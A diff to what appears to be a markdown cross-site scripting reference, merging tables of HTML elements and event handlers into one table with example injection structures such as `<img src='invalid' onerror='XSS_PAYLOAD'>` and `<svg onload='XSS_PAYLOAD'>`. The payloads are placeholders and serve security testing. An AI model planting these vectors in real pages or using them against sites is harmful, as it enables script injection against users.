@@ -3,33 +3,20 @@
 
 ## Auto-Triggered 
 
-| Element | Events |
-|----------|---------|
-| `<body>` | `onload` |
-| `<img>` | `onload`, `onerror` |
-| `<svg>` | `onload` |
-| `<iframe>` | `onload` |
-| `<video>` | `onload`, `onerror` |
-| `<audio>` | `onload`, `onerror` |
-
-## User-Triggered
-
-| Element | Events |
-|----------|---------|
-| `<a>` | `onclick`, `onmouseover` |
-| `<button>` | `onclick` |
-| `<div>` | `onclick`, `onmouseover` |
-| `<span>` | `onclick`, `onmouseover` |
-
-## Form Elements
-
-| Element | Events |
-|----------|---------|
-| `<input>` | `onfocus`, `onblur`, `onchange` |
-| `<textarea>` | `onfocus`, `onblur`, `onchange` |
-| `<select>` | `onchange` |
-| `<form>` | `onsubmit`, `onreset` |
-
+| Element | Common Events | Example Structure |
+|----------|--------------|------------------|
+| `<body>` | `onload` | `<body onload="XSS_PAYLOAD">` |
+| `<img>` | `onload`, `onerror` | `<img src="invalid" onerror="XSS_PAYLOAD">` |
+| `<svg>` | `onload` | `<svg onload="XSS_PAYLOAD">` |
+| `<iframe>` | `onload` | `<iframe onload="XSS_PAYLOAD">` |
+| `<video>` | `onload`, `onerror` | `<video onerror="XSS_PAYLOAD">` |
+| `<audio>` | `onload`, `onerror` | `<audio onerror="XSS_PAYLOAD">` |
+| `<a>` | `onclick`, `onmouseover` | `<a onclick="XSS_PAYLOAD">Link</a>` |
+| `<button>` | `onclick` | `<button onclick="XSS_PAYLOAD">Click</button>` |
+| `<div>` | `onclick`, `onmouseover` | `<div onclick="XSS_PAYLOAD">Content</div>` |
+| `<input>` | `onfocus`, `onchange` | `<input onfocus="XSS_PAYLOAD">` |
+| `<textarea>` | `onfocus`, `onchange` | `<textarea onfocus="XSS_PAYLOAD"></textarea>` |
+| `<form>` | `onsubmit` | `<form onsubmit="XSS_PAYLOAD">` |
 
 
 <img src=x onerror="xss_PAYLOAD">
